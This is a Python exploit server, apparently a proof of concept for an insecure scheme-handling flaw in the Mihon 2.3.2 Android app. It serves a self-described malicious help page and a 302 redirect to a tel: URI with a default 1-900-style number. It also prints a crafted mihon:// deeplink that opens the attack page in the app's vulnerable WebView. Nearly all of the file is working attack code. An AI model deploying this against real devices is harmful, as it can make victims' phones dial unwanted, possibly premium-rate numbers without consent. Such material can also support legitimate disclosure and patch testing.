#!/usr/bin/env python3
"""
Mihon 2.3.2 Insecure System Scheme Handling EXP server.

HTTP port 8000 serves:
  GET /exp/2.3.2       malicious help page that triggers tel:
  GET /redirect-tel    302 redirect to tel:<number>
"""

import os
import socket
import urllib.parse as up
from http.server import BaseHTTPRequestHandler, HTTPServer

EXP_DIR = "exp"
DEFAULT_NUMBER = "+19005550199"


def get_local_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return "127.0.0.1"


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[8000/http] {self.client_address[0]} - {fmt % args}")

    def do_GET(self):
        parsed = up.urlparse(self.path)
        params = up.parse_qs(parsed.query)

        if parsed.path == "/redirect-tel":
            number = params.get("number", [DEFAULT_NUMBER])[0]
            target = f"tel:{number}"
            self.send_response(302)
            self.send_header("Location", target)
            self.end_headers()
            print(f"  -> redirect to {target}")
            return

        if parsed.path == "/exp/2.3.2":
            self.serve_file(os.path.join(EXP_DIR, "2.3.2.html"), "text/html; charset=utf-8")
            return

        self.respond(
            200,
            (
                "Mihon 2.3.2 EXP server running\n"
                "Open /exp/2.3.2 from the vulnerable WebView.\n"
            ).encode("utf-8"),
            "text/plain; charset=utf-8",
        )

    def serve_file(self, path, content_type):
        if not os.path.exists(path):
            self.respond(404, f"{path} not found\n".encode("utf-8"), "text/plain; charset=utf-8")
            return

        with open(path, "rb") as handle:
            data = handle.read()
        self.respond(200, data, content_type)
        print(f"  -> served {path}")

    def respond(self, code, body, content_type):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    local_ip = get_local_ip()
    print("[*] Mihon 2.3.2 EXP server")
    print(f"[*] Local IP: {local_ip}")
    print("[*] HTTP: http://0.0.0.0:8000")
    print(f"[*] Attack page: http://{local_ip}:8000/exp/2.3.2")
    print(
        "[*] Deeplink: "
        f"mihon://help/webview?url={up.quote(f'http://{local_ip}:8000/exp/2.3.2', safe='')}"
    )
    HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
